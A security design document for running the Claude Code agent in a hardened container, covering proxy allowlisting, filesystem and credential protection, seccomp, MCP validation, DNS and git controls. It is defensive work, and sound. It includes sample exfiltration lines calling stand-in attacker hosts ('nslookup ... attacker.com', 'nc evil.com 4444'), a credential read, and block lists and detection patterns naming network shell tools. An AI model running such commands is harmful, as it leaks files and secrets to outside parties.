# Secure Claude Code Container Design

A comprehensive security design for running Claude Code inside a container with defense-in-depth protections against supply chain attacks, data exfiltration, and other threats.

**Last Updated:** January 2026

---

## Introduction

### Purpose

Claude Code depends on NPM, which has a history of supply chain security issues. Compromised packages can spread malware, exfiltrate data, and establish backdoors. This design ensures Claude Code cannot perform malicious actions even if a dependency is compromised.

### Security Principle

**Deny by default, allow by exception.**

Every entry and exit point is locked down. Access is granted only to explicitly allowed resources.

### Baseline

This design builds upon the existing `Containerfile`/`Dockerfile` which provides:
- Non-root user (`claude-agent`) with restricted shell
- Two-tier user model (`claude` for build, `claude-agent` for runtime)
- Workspace isolation via user permissions
- Container isolation

### Related Documents

- [CONFIG_SECURITY_GUIDE.md](./CONFIG_SECURITY_GUIDE.md) - Claude Code configuration file security guide

---

## Table of Contents

1. [Design 1: Network Isolation with Proxy Architecture](#design-1-network-isolation-with-proxy-architecture)
2. [Design 2: Filesystem Isolation & Access Control](#design-2-filesystem-isolation--access-control)
3. [Design 3: Credential Protection](#design-3-credential-protection)
4. [Design 4: Process & Runtime Isolation](#design-4-process--runtime-isolation)
5. [Design 5: MCP Server Security](#design-5-mcp-server-security)
6. [Design 6: DNS Exfiltration Prevention](#design-6-dns-exfiltration-prevention)
7. [Design 7: Git Operations Security](#design-7-git-operations-security)
8. [Design 8: Subprocess/Bash Execution Security](#design-8-subprocessbash-execution-security)
9. [Implementation Artifacts](#implementation-artifacts)
10. [Implementation Notes](#implementation-notes)

---

## Design 1: Network Isolation with Proxy Architecture

### Problem

WebFetch/WebSearch tools require internet access, but opening network broadly allows compromised NPM packages to exfiltrate data.

### Solution

Split-process proxy architecture where Claude Code has no direct internet access.

```
┌─────────────────────────────────────────────────────────────────┐
│                        HOST NETWORK                             │
└─────────────────────────────────────────────────────────────────┘
                              ▲
                              │ HTTPS (443)
                              │ (allowlist only)
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  PROXY CONTAINER (net-proxy)                                    │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  squid/tinyproxy with strict allowlist:                  │   │
│  │  - api.anthropic.com (Claude API)                        │   │
│  │  - *.google.com (WebSearch)                              │   │
│  │  - User-specified domains                                │   │
│  │  Logging: ALL requests logged                            │   │
│  │  Rate limiting: Prevent high-volume exfiltration         │   │
│  └──────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
                              ▲
                              │ Internal network (isolated)
                              │ HTTP_PROXY=http://net-proxy:3128
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  CLAUDE CODE CONTAINER (claudebox)                              │
│  - NO direct internet access                                    │
│  - Can ONLY reach proxy container                               │
│  - DNS queries go through proxy (no DNS exfiltration)           │
└─────────────────────────────────────────────────────────────────┘
```

### Key Features

1. **Domain allowlist** - Only pre-approved domains can be reached
2. **Request logging** - All outbound requests logged for audit
3. **Rate limiting** - Prevents bulk data exfiltration
4. **DNS containment** - DNS queries routed through proxy
5. **Separate container** - Proxy isolated from Claude Code

### Proxy Error Responses

When proxy blocks a request to non-allowlisted domain:

```
HTTP/1.1 403 Forbidden
Content-Type: application/json
X-Proxy-Block-Reason: domain-not-allowlisted

{
  "error": "blocked_by_security_proxy",
  "code": 403,
  "domain": "<blocked-domain>",
  "message": "Domain not in proxy allowlist",
  "resolution": "Add '<domain>' to proxy-allowlist.conf and restart proxy"
}
```

### Error Codes

| Code | Meaning |
|------|---------|
| 403 | Domain not in allowlist |
| 403 | Non-HTTPS request blocked |
| 429 | Rate limit exceeded (anti-exfiltration) |
| 502 | Upstream server unreachable |

### Implementation

```bash
# Create internal network
podman network create --internal claude-internal

# Proxy container (bridges internal and external)
podman run -d --name net-proxy \
    --network claude-internal \
    --network slirp4netns \
    -v ./proxy-allowlist.conf:/etc/squid/allowlist.conf:ro \
    squid-proxy:latest

# Claude Code container (internal only)
podman run --rm -it \
    --network claude-internal \
    -e HTTP_PROXY=http://net-proxy:3128 \
    -e HTTPS_PROXY=http://net-proxy:3128 \
    claudebox:latest
```

### Protections

- Compromised NPM packages trying to phone home
- Data exfiltration via HTTP/HTTPS
- DNS tunneling attacks
- Unauthorized API calls

---

## Design 2: Filesystem Isolation & Access Control

### Problem

Claude Code has access to `/workspace` and could potentially escape or access sensitive files via symlinks, path traversal, etc.

### Solution

Read-only root filesystem with explicit writable locations.

```
┌─────────────────────────────────────────────────────────────────┐
│  FILESYSTEM SECURITY LAYERS                                     │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. READ-ONLY ROOT FILESYSTEM                                   │
│     - Container runs with --read-only flag                      │
│     - Only specific paths writable via tmpfs/mounts             │
│                                                                 │
│  2. WRITABLE LOCATIONS (explicit allowlist)                     │
│     /workspace              - Project files (bind mount)        │
│     /tmp                    - Temp files (tmpfs, size-limited)  │
│     ~/.claude/projects      - Session logs                      │
│                                                                 │
│  3. READ-ONLY LOCATIONS                                         │
│     ~/.claude/settings.json      - Settings (configured before) │
│     ~/.claude/.credentials.json  - Credentials (injected)       │
│                                                                 │
│  4. DENIED LOCATIONS (via permissions/seccomp)                  │
│     /etc/passwd, /etc/shadow - System files                     │
│     /proc (limited view)     - Process info                     │
│     /sys                     - Kernel params                    │
│     /root                    - Root home                        │
│     /home/claude             - Supervisory user                 │
│                                                                 │
│  5. SECCOMP PROFILE                                             │
│     - Block: mount, umount, ptrace, reboot, syslog              │
│     - Block: personality, pivot_root, chroot                    │
│     - Allow: standard file I/O, process management              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Mount Strategy

```bash
$RUNTIME run --rm -it \
    --read-only \

    # Project workspace - read/write
    -v "$SCRIPT_DIR":/workspace:rw \

    # Settings & credentials - READ-ONLY
    -v "$CLAUDE_DIR/.claude/settings.json":/home/claude-agent/.claude/settings.json:ro \
    -v "$CLAUDE_DIR/.claude/.credentials.json":/home/claude-agent/.claude/.credentials.json:ro \

    # Session logs - read/write
    -v "$CLAUDE_DIR/.claude/projects":/home/claude-agent/.claude/projects:rw \

    # Temp files
    --tmpfs /tmp:size=100M,mode=1777 \
    --tmpfs /run:size=10M \

    # Security options
    --security-opt no-new-privileges \
    --security-opt seccomp=seccomp-profile.json \
    --cap-drop ALL \
    ...
```

### Protections

- Filesystem escape attempts
- Writing malicious binaries outside workspace
- Symlink-based attacks (like CVE-2025-59829)
- Privilege escalation via filesystem

---

## Design 3: Credential Protection

### Problem

API keys and OAuth tokens could be exfiltrated by compromised NPM packages.

### Solution

Two-tier credential injection system.

### Primary: 1Password CLI Integration

For users with 1Password on any platform. Credentials never stored in plaintext.

```
┌─────────────────────────────────────────────────────────────────┐
│  1PASSWORD WORKFLOW                                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. Store credentials in 1Password vault                        │
│     - OAuth access token                                        │
│     - OAuth refresh token                                       │
│     - Expiry timestamp                                          │
│                                                                 │
│  2. Template file (safe to commit):                             │
│     {                                                           │
│       "claudeAiOauth": {                                        │
│         "accessToken": "op://Vault/Claude/access",              │
│         "refreshToken": "op://Vault/Claude/refresh",            │
│         "expiresAt": {{ op://Vault/Claude/expiry }}             │
│       }                                                         │
│     }                                                           │
│                                                                 │
│  3. Inject at runtime:                                          │
│     op inject -i creds.tpl -o /tmp/creds.json                   │
│     Mount /tmp/creds.json into container as read-only           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Fallback: Encrypted Credentials File (age)

For users without 1Password. Cross-platform using `age` encryption.

```
┌─────────────────────────────────────────────────────────────────┐
│  ENCRYPTED CREDENTIALS WORKFLOW                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  SETUP (one-time):                                              │
│  $ age -p -o ~/.claude/credentials.json.age \                   │
│        ~/.claude/.credentials.json                              │
│  $ rm ~/.claude/.credentials.json   # remove plaintext          │
│                                                                 │
│  AT RUNTIME:                                                    │
│  1. Prompt user for passphrase                                  │
│  2. Decrypt to tmpfs: /dev/shm/claude-creds.json                │
│  3. Mount tmpfs file into container (RO)                        │
│  4. On exit: shred & remove decrypted file                      │
│                                                                 │
│  CROSS-PLATFORM:                                                │
│  - Linux: tmpfs at /dev/shm or /run/user/$UID                   │
│  - macOS: ramfs or secure temp directory                        │
│  - Windows: encrypted temp + secure delete                      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Fallback Implementation

```bash
#!/bin/bash
CREDS_ENC="$HOME/.claude/credentials.json.age"
CREDS_TMP="/dev/shm/claude-creds-$$.json"

# Decrypt with passphrase prompt
age -d -o "$CREDS_TMP" "$CREDS_ENC" || exit 1
chmod 600 "$CREDS_TMP"

# Cleanup on exit
trap "shred -u '$CREDS_TMP' 2>/dev/null" EXIT

$RUNTIME run --rm -it \
    -v "$CREDS_TMP":/home/claude-agent/.claude/.credentials.json:ro \
    ...
```

### Comparison

| Method | Plaintext on Disk | External Tool | Cross-Platform |
|--------|-------------------|---------------|----------------|
| 1Password | No | op CLI | Yes |
| age encryption | No (encrypted) | age | Yes |
| Podman secrets | tmpfs (swap risk) | None | Linux only |

### Protections

- API key exposure via `docker inspect`
- Environment snooping via `/proc/*/environ`
- Credential theft by malicious packages

---

## Design 4: Process & Runtime Isolation

### Problem

Malicious code could spawn background processes, use IPC for communication, or exploit kernel vulnerabilities.

### Solution

Comprehensive container runtime hardening.

```
┌─────────────────────────────────────────────────────────────────┐
│  RUNTIME ISOLATION LAYERS                                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. NAMESPACE ISOLATION                                         │
│     --pid=private      → Isolated PID namespace                 │
│     --ipc=private      → Isolated IPC namespace                 │
│     --uts=private      → Isolated hostname                      │
│     --userns=keep-id   → User namespace (rootless)              │
│                                                                 │
│  2. CAPABILITY DROPPING                                         │
│     --cap-drop=ALL     → Remove all Linux capabilities          │
│                                                                 │
│  3. PRIVILEGE RESTRICTIONS                                      │
│     --security-opt no-new-privileges                            │
│     → Prevents privilege escalation via setuid/setgid           │
│                                                                 │
│  4. RESOURCE LIMITS                                             │
│     --memory=2g        → Max 2GB RAM                            │
│     --cpus=2           → Max 2 CPU cores                        │
│     --pids-limit=256   → Max 256 processes                      │
│                                                                 │
│  5. SECCOMP PROFILE                                             │
│     Block dangerous syscalls:                                   │
│     - mount, umount, pivot_root, chroot                         │
│     - ptrace, process_vm_readv, process_vm_writev               │
│     - reboot, syslog, kexec_load                                │
│     - init_module, finit_module, delete_module                  │
│     - bpf, perf_event_open                                      │
│     - keyctl (kernel keyring access)                            │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Implementation

```bash
$RUNTIME run --rm -it \
    --read-only \
    --pid=private \
    --ipc=private \
    --uts=private \
    --cap-drop=ALL \
    --security-opt no-new-privileges \
    --security-opt seccomp=seccomp-profile.json \
    --memory=2g \
    --cpus=2 \
    --pids-limit=256 \
    --tmpfs /tmp:size=100M,mode=1777,noexec \
    --tmpfs /run:size=10M,mode=755 \
    ...
```

### Protections

- Container escape via kernel exploits
- Privilege escalation
- Resource exhaustion attacks (cryptomining)
- Process snooping/injection
- IPC-based data exfiltration

---

## Design 5: MCP Server Security

### Problem

MCP servers can exfiltrate data, execute arbitrary commands, or capture credentials.

### Solution

Distributed security enforcement with separation of concerns.

```
┌─────────────────────────────────────────────────────────────────┐
│  DISTRIBUTED SECURITY ENFORCEMENT                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  CONTAINER LAYER                    PROXY LAYER                 │
│  (Claude Code)                      (Network Gatekeeper)        │
│  ┌─────────────────────┐            ┌─────────────────────┐     │
│  │                     │            │                     │     │
│  │ Validates:          │            │ Enforces:           │     │
│  │ • Stdio MCPs only   │            │ • ALL network I/O   │     │
│  │ • Command injection │            │ • Network MCPs      │     │
│  │   patterns          │            │ • WebFetch/Search   │     │
│  │                     │            │ • Any HTTP(S)       │     │
│  │ Knows nothing about │            │                     │     │
│  │ network enforcement │            │ Single allowlist    │     │
│  │                     │            │ for everything      │     │
│  └─────────────────────┘            └─────────────────────┘     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Stdio MCP Validation (Container-side)

```bash
#!/bin/bash
# validate-stdio-mcp.sh

ALLOWED_STDIO=("note" "todo" "zet" "gopls" "dot")
MCP_CONFIG="/workspace/.mcp.json"

if [[ -f "$MCP_CONFIG" ]]; then
    stdio_cmds=$(jq -r '
        .mcpServers | to_entries[] |
        select(.value.command) |
        select(.value.url | not) |
        .value.command
    ' "$MCP_CONFIG" 2>/dev/null)

    for cmd in $stdio_cmds; do
        base_cmd=$(basename "$cmd")
        if [[ ! " ${ALLOWED_STDIO[*]} " =~ " ${base_cmd} " ]]; then
            echo "BLOCKED: Unknown stdio MCP: $cmd"
            exit 1
        fi
        # Injection check
        args=$(jq -r ".mcpServers | to_entries[] | select(.value.command==\"$cmd\") | .value.args[]?" "$MCP_CONFIG" 2>/dev/null)
        if echo "$args" | grep -qE '(;|\||&&|`|\$\(|curl|wget|nc )'; then
            echo "BLOCKED: Suspicious args in MCP: $cmd"
            exit 1
        fi
    done
fi
```

### Network MCP Enforcement (Proxy-side)

Network MCPs are controlled entirely by the proxy allowlist. Claude Code doesn't validate network MCPs - it just attempts to connect, and the proxy allows or blocks.

### Proxy Allowlist (`proxy-allowlist.conf`)

```conf
# === REQUIRED (do not remove) ===
api.anthropic.com

# === WebSearch ===
.google.com
.googleapis.com

# === Network MCPs (add your MCP server domains here) ===
mcp.linear.app
github-mcp.mycompany.com

# === Git Hosting ===
github.com
gitlab.com
```

### Benefits

1. **Single config** - One allowlist at proxy for all network access
2. **True enforcement** - Claude Code can't bypass proxy
3. **Simpler container** - Only validates stdio commands
4. **Opacity** - Container doesn't know what's allowed
5. **Auditability** - All network access logged at proxy

### Protections

- Malicious MCP servers exfiltrating data
- Command injection via MCP configs
- Unauthorized network MCP connections

---

## Design 6: DNS Exfiltration Prevention

### Problem

Malicious code can encode data in DNS queries:
```bash
nslookup $(cat /etc/passwd | base64).attacker.com
```

### Solution

No direct DNS access from Claude Code container.

```
┌─────────────────────────────────────────────────────────────────┐
│  DNS SECURITY                                                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  • Container has NO direct DNS access                           │
│  • All HTTP(S) goes through proxy                               │
│  • Proxy resolves DNS on behalf of container                    │
│  • No DNS queries originate from Claude Code container          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Implementation

```bash
$RUNTIME run --rm -it \
    --dns=127.0.0.1 \           # Localhost only (no external DNS)
    --dns-search=. \            # No search domains
    --network=claude-internal \ # Internal network only
    ...
```

Since all traffic goes through the proxy (Design 1), and the proxy resolves DNS, the Claude Code container never needs direct DNS access.

### Protections

- DNS tunneling/exfiltration completely eliminated

---

## Design 7: Git Operations Security

### Problem

Git operations can be exploited for cloning malicious repos, pushing sensitive data, or credential theft.

### Solution

HTTPS-only Git with proxy enforcement and push validation.

```
┌─────────────────────────────────────────────────────────────────┐
│  GIT SECURITY                                                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. NETWORK RESTRICTIONS (inherited from Design 1)              │
│     • Git HTTPS: Goes through proxy, subject to allowlist       │
│     • Git SSH: BLOCKED (no direct network)                      │
│     • Only allowlisted Git hosts reachable                      │
│                                                                 │
│  2. GIT CREDENTIAL PROTECTION                                   │
│     • No credential helpers configured                          │
│     • Git tokens injected via 1Password/age                     │
│     • Credentials never stored in .git/config                   │
│                                                                 │
│  3. GIT PUSH (Allowlisted Remotes)                              │
│     • Only push to pre-approved remotes                         │
│     • Proxy logs all push traffic                               │
│     • Pre-push hook validates remote                            │
│                                                                 │
│  4. SENSITIVE FILE PROTECTION                                   │
│     • Pre-commit hook scans for secrets                         │
│     • Blocks commits containing API keys, tokens                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Git Config for Container

```ini
# /etc/gitconfig or ~/.gitconfig

[credential]
    helper = ""

[url "https://github.com/"]
    insteadOf = git@github.com:

[url "https://gitlab.com/"]
    insteadOf = git@gitlab.com:

[http]
    proxy = http://net-proxy:3128

[core]
    hooksPath = /etc/git-hooks

[push]
    default = nothing   # Require explicit refspec
```

### Pre-push Hook

```bash
#!/bin/bash
# /etc/git-hooks/pre-push

ALLOWED_REMOTES=("github.com/myorg" "gitlab.mycompany.com")

remote_url=$(git remote get-url "$1" 2>/dev/null)
for allowed in "${ALLOWED_REMOTES[@]}"; do
    [[ "$remote_url" == *"$allowed"* ]] && exit 0
done

echo "ERROR: Push to unauthorized remote blocked: $remote_url"
exit 1
```

### Protections

- SSH-based data exfiltration
- Push to attacker-controlled remotes
- Credential theft via git helpers
- Accidental secret commits

---

## Design 8: Subprocess/Bash Execution Security

### Problem

Claude Code's Bash tool can execute arbitrary commands, enabling reconnaissance, exfiltration, and backdoor installation.

### Solution

Defense in depth with inherited protections, command restrictions, and audit logging.

```
┌─────────────────────────────────────────────────────────────────┐
│  BASH/SUBPROCESS SECURITY                                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  LAYER 1: INHERITED PROTECTIONS                                 │
│  • Network: All egress through proxy (Design 1)                 │
│  • Filesystem: Read-only root, limited write (Design 2)         │
│  • Capabilities: All dropped (Design 4)                         │
│  • Seccomp: Dangerous syscalls blocked (Design 4)               │
│  • DNS: No direct access (Design 6)                             │
│                                                                 │
│  LAYER 2: COMMAND POLICY                                        │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │ KEEP (controlled by proxy):                             │    │
│  │   curl, wget, ssh, pip, npm, python, node               │    │
│  │                                                         │    │
│  │ REMOVE (no legitimate dev use):                         │    │
│  │   nc, netcat, ncat, socat, nmap, tcpdump, telnet        │    │
│  │                                                         │    │
│  │ NOT INSTALLED:                                          │    │
│  │   sudo, su, crontab, at                                 │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                 │
│  LAYER 3: COMMAND LOGGING (append-only)                         │
│  • All bash commands logged with timestamp                      │
│  • Log file: /var/log/claudebox/commands.log                    │
│  • chattr +a on host (append-only attribute)                    │
│  • Container cannot delete/truncate (no CAP_LINUX_IMMUTABLE)    │
│                                                                 │
│  LAYER 4: RESOURCE LIMITS                                       │
│  • ulimit -t 300      (5 min CPU time max)                      │
│  • ulimit -f 102400   (100MB max file size)                     │
│  • ulimit -n 256      (256 open files max)                      │
│  • ulimit -u 64       (64 processes max)                        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Remove Attack Tools (Containerfile)

```dockerfile
# Remove attack tools with no dev purpose
RUN rm -f /usr/bin/nc /usr/bin/netcat /usr/bin/ncat \
         /usr/bin/socat /usr/bin/telnet \
         /usr/bin/nmap /usr/bin/tcpdump \
    && echo "Attack tools removed"
```

### Append-Only Logging Setup (Host-side)

```bash
#!/bin/bash
# Run before container start

LOG_DIR="./claudebox-logs"
LOG_FILE="$LOG_DIR/commands.log"

mkdir -p "$LOG_DIR"
touch "$LOG_FILE"
chattr +a "$LOG_FILE"  # Append-only
```

### Command Logging (Container-side)

```bash
# /etc/profile.d/claudebox-audit.sh
export PROMPT_COMMAND='
  EXIT_CODE=$?
  echo "$(date -Iseconds) | $EXIT_CODE | $(history 1 | sed "s/^[ ]*[0-9]*[ ]*//")" \
    >> /var/log/claudebox/commands.log 2>/dev/null
'
```

### Defense in Depth Summary

| Attack Vector | Blocked By |
|--------------|------------|
| `curl https://evil.com` | Proxy allowlist |
| `nc evil.com 4444` | Binary removed + no network |
| `cat ~/.ssh/id_rsa` | Filesystem restrictions |
| `sudo anything` | Not installed + no caps |
| Fork bomb | ulimit nproc + pids-limit |
| DNS exfiltration | No DNS access |
| Install backdoor | Read-only filesystem |
| Delete audit logs | Append-only attribute |

---

## Implementation Artifacts

### Seccomp Profile (`seccomp-profile.json`)

```json
{
  "defaultAction": "SCMP_ACT_ALLOW",
  "syscalls": [
    {
      "names": [
        "mount",
        "umount",
        "umount2",
        "pivot_root",
        "chroot",
        "ptrace",
        "process_vm_readv",
        "process_vm_writev",
        "reboot",
        "syslog",
        "kexec_load",
        "kexec_file_load",
        "init_module",
        "finit_module",
        "delete_module",
        "bpf",
        "perf_event_open",
        "keyctl",
        "request_key",
        "add_key",
        "acct",
        "quotactl",
        "swapon",
        "swapoff",
        "nfsservctl",
        "personality",
        "unshare",
        "setns",
        "kcmp",
        "userfaultfd"
      ],
      "action": "SCMP_ACT_ERRNO",
      "errnoRet": 1
    }
  ]
}
```

### Proxy Allowlist (`proxy-allowlist.conf`)

```conf
# === REQUIRED (Claude API) ===
api.anthropic.com

# === WebSearch ===
.google.com
.googleapis.com

# === Network MCPs ===
# Add your MCP server domains here
# mcp.linear.app
# github-mcp.mycompany.com

# === Git Hosting ===
github.com
gitlab.com
# git.mycompany.internal

# === Package Registries (if needed) ===
# registry.npmjs.org
# pypi.org
```

### Complete Container Run Command

```bash
$RUNTIME run --rm -it \
    # Read-only root filesystem
    --read-only \

    # Namespace isolation
    --pid=private \
    --ipc=private \
    --uts=private \

    # Drop all capabilities
    --cap-drop=ALL \

    # Prevent privilege escalation
    --security-opt no-new-privileges \
    --security-opt seccomp=seccomp-profile.json \

    # Resource limits
    --memory=2g \
    --cpus=2 \
    --pids-limit=256 \
    --ulimit cpu=300 \
    --ulimit fsize=104857600 \
    --ulimit nofile=256 \
    --ulimit nproc=64 \

    # Network (internal only, proxy access)
    --network=claude-internal \
    --dns=127.0.0.1 \
    --dns-search=. \
    -e HTTP_PROXY=http://net-proxy:3128 \
    -e HTTPS_PROXY=http://net-proxy:3128 \

    # Filesystem mounts
    -v "$SCRIPT_DIR":/workspace:rw \
    -v "$CLAUDE_DIR/.claude/settings.json":/home/claude-agent/.claude/settings.json:ro \
    -v "$CREDS_FILE":/home/claude-agent/.claude/.credentials.json:ro \
    -v "$CLAUDE_DIR/.claude/projects":/home/claude-agent/.claude/projects:rw \
    -v "$LOG_DIR":/var/log/claudebox:rw \

    # Temp filesystems
    --tmpfs /tmp:size=100M,mode=1777,noexec \
    --tmpfs /run:size=10M,mode=755 \

    claudebox:latest
```

---

## Implementation Notes

### User Account Separation: `claude` vs `claude-agent`

#### Design Intent

| Account | Purpose | Owns | Can Access |
|---------|---------|------|------------|
| `claude` | Config supervisor | `~/.claude/*` (settings, creds) | Everything |
| `claude-agent` | Runtime executor | Session logs only | Reads `claude`'s config |

#### Current Problem

The current implementation mounts config directly to `claude-agent`'s home, bypassing the intended separation:

```bash
# Current (incorrect)
-v "$SCRIPT_DIR/claude":/home/claude-agent:rw
```

#### Fix: Symlink + Group Permissions Approach

**Step 1: Update Containerfile - Directory Structure & Ownership**

```dockerfile
# Create claude's config directory (supervisor owns this)
RUN mkdir -p /home/claude/.claude && \
    chown -R claude:claude /home/claude/.claude && \
    chmod 750 /home/claude/.claude

# Create claude-agent's directory with symlinks to claude's config
RUN mkdir -p /home/claude-agent/.claude/projects && \
    ln -s /home/claude/.claude/settings.json /home/claude-agent/.claude/settings.json && \
    ln -s /home/claude/.claude/settings.local.json /home/claude-agent/.claude/settings.local.json && \
    ln -s /home/claude/.claude/.credentials.json /home/claude-agent/.claude/.credentials.json && \
    chown -R claude-agent:claude /home/claude-agent/.claude && \
    chown -h claude-agent:claude /home/claude-agent/.claude/*.json

# Set permissions: claude owns config, claude-agent can read via group
RUN chmod 640 /home/claude/.claude/settings.json 2>/dev/null || true && \
    chmod 640 /home/claude/.claude/settings.local.json 2>/dev/null || true && \
    chmod 640 /home/claude/.claude/.credentials.json 2>/dev/null || true
```

**Step 2: Update claudebox - Mount Strategy**

```bash
$RUNTIME run --rm -it \
    # Config files mounted to claude's home (symlinks point here)
    -v "$CLAUDE_DIR/settings.json":/home/claude/.claude/settings.json:ro \
    -v "$CLAUDE_DIR/settings.local.json":/home/claude/.claude/settings.local.json:ro \
    -v "$CREDS_FILE":/home/claude/.claude/.credentials.json:ro \

    # Session logs directly to claude-agent's directory (needs write)
    -v "$CLAUDE_DIR/projects":/home/claude-agent/.claude/projects:rw \

    # Workspace
    -v "$SCRIPT_DIR":/workspace:rw \
    ...
```

#### How It Works

```
/home/claude/.claude/                    # Owned by claude:claude (750)
├── settings.json                        # Mode 640 (claude RW, group R)
├── settings.local.json                  # Mode 640
└── .credentials.json                    # Mode 640

/home/claude-agent/.claude/              # Owned by claude-agent:claude
├── settings.json -> /home/claude/.claude/settings.json      # Symlink
├── settings.local.json -> /home/claude/.claude/settings.local.json
├── .credentials.json -> /home/claude/.claude/.credentials.json
└── projects/                            # Owned by claude-agent:claude (RW)
    └── *.jsonl                          # Session logs
```

#### Security Properties

| File | Owner | Mode | claude | claude-agent |
|------|-------|------|--------|--------------|
| settings.json | claude:claude | 640 | RW | R (via group) |
| .credentials.json | claude:claude | 640 | RW | R (via group) |
| projects/*.jsonl | claude-agent:claude | 644 | RW | RW |

#### Result

- `claude-agent` **cannot modify** settings or credentials (read-only via symlinks + group)
- `claude-agent` **can read** config files (group membership)
- `claude-agent` **can write** session logs (owns projects/ directory)
- Config files are **protected** even if Claude Code is compromised

### age Installation

```bash
# Linux
apt install age  # Debian/Ubuntu
dnf install age  # Fedora/RHEL

# macOS
brew install age

# Windows
scoop install age
winget install age
```

### 1Password CLI Installation

See [1Password CLI documentation](https://developer.1password.com/docs/cli/get-started/).

---

## Summary

This design implements defense-in-depth with 8 security layers:

| Layer | Protects Against |
|-------|------------------|
| 1. Network Proxy | HTTP/HTTPS exfiltration, unauthorized API calls |
| 2. Filesystem | Escape attempts, malicious writes, symlink attacks |
| 3. Credentials | Token theft, credential exposure |
| 4. Runtime | Container escape, privilege escalation, resource abuse |
| 5. MCP Security | Malicious MCP servers, command injection |
| 6. DNS | DNS tunneling/exfiltration |
| 7. Git | Push to unauthorized remotes, credential theft |
| 8. Bash | Attack tool usage, audit tampering |

**Principle:** Even if a compromised NPM package gains code execution inside Claude Code, it cannot:
- Exfiltrate data (network proxy blocks)
- Phone home to C2 (allowlist only)
- Access credentials (read-only, injected)
- Escape container (capabilities dropped, seccomp)
- Tamper with audit logs (append-only)
- Use attack tools (removed from image)

---

*This document should be reviewed and updated as Claude Code evolves and new attack vectors are discovered.*
